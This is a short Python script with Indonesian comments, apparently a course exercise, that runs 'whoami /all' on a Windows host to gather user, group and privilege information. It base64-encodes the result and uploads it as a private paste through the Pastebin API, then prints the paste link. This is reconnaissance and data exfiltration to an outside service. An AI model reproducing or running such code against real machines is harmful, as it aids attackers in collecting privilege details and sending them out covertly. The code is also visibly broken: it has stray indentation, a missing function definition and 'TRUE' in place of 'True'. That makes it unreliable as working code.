import base64
import requests
import sys
import platform
from subprocess import Popen, PIPE

    message = "This is Host Reconnaissance. \n"
    # Command whoami /all digunakan untuk mengambil informasi milik user, group dan juga privileges apa saja yang dimiliki
    process = Popen("whoami /all", stdin = PIPE, stdout = PIPE, stderr = PIPE, shell = TRUE)
    result, err = process.communicate()

    # Command yang telah digunakan akan disimpan ke dalam message
    if result == b'':
        message += err.decode()
    elif result != b'':
        message = f"Result from Host Reconnaissance: \n{result.decode()}"

    # Encode ke Base64
    encoded_message = base64.b64encode(message.encode())

    # Endpoint dan API Key yang akan digunakan
    pastebin_URL = 'https://pastebin.com/api/api_post.php'
    pastebin_key = '<UNIQUE_DEVELOPER_API_KEY>'

    # Simpan hasil encoding ke information
    information = encoded_message

    # Request data yang akan dikirimkan ke API milik Pastebin
    data = {
        'api_dev_key': pastebin_key,
        'api_option': 'paste',
        'api_paste_name': "GSLC_Pastebin",
        'api_paste_code': information,
        'api_paste_private': 1
    }

# Kirim dengan Post method, dan print link dari Pastebin yang telah terbuat
pastebin = requests.post(url=pastebin_URL, data=data)
pastebin_link = pastebin.text
print(f"Link: {pastebin_link}")



